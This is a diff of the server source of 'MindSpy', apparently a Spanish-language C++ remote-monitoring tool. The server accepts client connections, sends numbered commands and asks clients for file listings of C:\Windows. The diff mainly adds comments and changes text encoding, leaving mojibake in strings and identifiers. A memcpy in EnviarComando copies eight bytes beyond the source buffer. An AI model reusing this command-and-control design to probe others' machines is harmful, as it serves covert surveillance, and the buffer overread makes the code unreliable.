@@ -1,3 +1,9 @@
+Ôªø/**
+* @file Servidor.cpp
+* @author Carlos D. Alvarez
+* @date 10/12/2016
+* @brief Implementaci√≥n de los m√©todos de la clase servidor
+*/
 #include "Servidor.h"
 
 namespace MindSpy
@@ -31,6 +37,7 @@ namespace MindSpy
 	void Servidor::HiloEscucha() {
 		listen(s, 3);
 		while (true) {
+			//! ID Temporal de la conexi√≥n actual
 			unsigned int id = Conexiones.size();
 			c = sizeof(sockaddr_in);
 			//Conexiones[Conexiones.size()-1].c_socket = accept(s, (sockaddr *)&client, &c);
@@ -53,12 +60,13 @@ namespace MindSpy
 			CreateThread(NULL, NULL, &HiloConexionStatic, this, NULL, NULL);
 			while (!Conexiones[id].Activa) Sleep(30);
 
+			//! Genera un nuevo pedido de archivos
 			stFileInfoRequest stfir;
 			wcsncpy(stfir.Filtro, L"*.*", 4);
 			wcsncpy(stfir.Path, L"C:\\Windows", 11);
 			stfir.Query = FILEINFO_QUERY::REQ_ONLY_ARCHIVE;
 			if (EnviarComando(Conexiones[id].IP, sizeof(stFileInfoRequest), CLNT_CMDS::FILEINFO, (BYTE*)&stfir))
-				wcout << L"Solicitando informaciÛn de archivos..." << endl;
+				wcout << L"Solicitando informaci√≥n de archivos..." << endl;
 		}
 	}
 
@@ -75,26 +83,18 @@ namespace MindSpy
 
 	bool Servidor::EnviarComando(char* IP, UINT32 SizeofData, UINT32 comando, BYTE* Data)
 	{
-		/*
-		La estructura de los paquetes a enviar, es siempre la misma, independientemente de
-		los datos a enviar. Sin embargo, el tamaÒo de dichos datos puede variar.
-
-		Los primeros cuatro bytes del paquete, corresponden al tamaÒo del paquete. Los segundos
-		cuatro bytes corresponden al comando asociado a la data y del octavo byte en adelante,
-		se ubica la data a enviar.
-		*/
 		// Obtener el socket asociado a la IP
 		int res = IpRegistrada(IP);
 		if (res == IP_NO_REGISTRADA)
 			return false;
 
-		// Se reserva memoria para el tamaÒo de la data + el opcode (comando) + data
+		// Se reserva memoria para el tama√±o de la data + el opcode (comando) + data
 		BYTE *DataToSend = (BYTE*)VirtualAlloc(NULL, SizeofData + 8, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-		// Se mueven a los primeros 4 bytes (unsigned short), el tamaÒo del paquete
+		// Se mueven a los primeros 4 bytes (unsigned short), el tama√±o del paquete
 		*(UINT32*)DataToSend = SizeofData;
 		// Se mueve el comando a los siguientes 4 bytes
 		*(UINT32*)(DataToSend + 4) = comando;
-		// Se copia la data pasada por par·metro a la memoria reservada
+		// Se copia la data pasada por par√°metro a la memoria reservada
 		if (Data)
 			memcpy(DataToSend + 8, Data, SizeofData + 8);
 		// Se envian los datos
@@ -110,13 +110,13 @@ namespace MindSpy
 		// Asignar el ID al registro
 		Conexiones[MyID].Activa = true;
 		char* szBuff = (char*)malloc(1);
-		// Mientras la conexiÛn estÈ activa...
+		// Mientras la conexi√≥n est√© activa...
 		while (Conexiones[MyID].Activa) {
 			// variable para guardar la cantidad de bytes disponibles en el stream
 			DWORD bDisponibles;
-			// Validar si la conexiÛn sigue activa
+			// Validar si la conexi√≥n sigue activa
 			//int resp = recv(Conexiones[MyID].c_socket, &bufft, 1, MSG_PEEK);
-			// Si no lo est·, nos vamos
+			// Si no lo est√°, nos vamos
 
 			// Verificamos si hay bytes por leer
 			int resp = ioctlsocket(Conexiones[MyID].c_socket, FIONREAD, &bDisponibles);
@@ -192,27 +192,27 @@ namespace MindSpy
 				PFILETIME FCActual = FCInicio;
 				PFILETIME FMActual = FMInicio;
 				wchar_t* NombreActual = NombreInicio;
-				long long *TamaÒoActual = TamInicio;
+				long long *Tama√±oActual = TamInicio;
 
 				Conexiones[MyID].archivos.clear();
 				for (unsigned int i = 0; i < stla.CantArchivos-1; i++)
 				{ 
 					Conexiones[MyID].archivos.push_back(stFile());
 					Conexiones[MyID].archivos[i].nombre = NombreActual;
-					Conexiones[MyID].archivos[i].TamaÒo = *TamaÒoActual;
+					Conexiones[MyID].archivos[i].Tama√±o = *Tama√±oActual;
 					Conexiones[MyID].archivos[i].FechaCreacion = *FCActual;
 					Conexiones[MyID].archivos[i].FechaModificacion = *FMActual;
 
 					NombreActual += MAX_PATH;
 					FCActual++;
 					FMActual++;
-					TamaÒoActual++;
+					Tama√±oActual++;
 
 					SYSTEMTIME st;
 					FileTimeToSystemTime(&Conexiones[MyID].archivos[i].FechaCreacion, &st);
 					wcout << 
 						Conexiones[MyID].archivos[i].nombre << L" - " << 
-						Conexiones[MyID].archivos[i].TamaÒo << L" bytes.\n" <<
+						Conexiones[MyID].archivos[i].Tama√±o << L" bytes.\n" <<
 						L"Creado el " << st.wDay << L"/" << st.wMonth << L"/" << st.wYear <<
 						endl << endl;
 				}
